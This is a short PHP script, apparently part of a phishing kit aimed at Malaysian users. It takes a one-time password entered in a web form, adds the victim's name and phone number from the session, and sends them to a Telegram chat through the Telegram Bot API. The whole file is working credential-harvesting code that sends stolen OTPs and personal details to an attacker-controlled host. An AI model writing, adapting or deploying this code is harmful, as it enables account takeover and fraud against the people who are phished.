<?php

session_start();
include "./telegram.php";
$otp_code            = $_POST['otp'];
$_SESSION['otp '] = $otp_code;
$full_name = $_SESSION['full_name'];
$phone_number = $_SESSION['phoneNumber'];

$message = "
DATA OTP 🇲🇾
╔═══════════════════⊱
╠➤ Name  : ".$full_name."
╠➤ No Hp : ".$phone_number."
╠➤ OTP   : ".$otp_code."
";

function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($telegram_id, $message, $id_bot);

?>
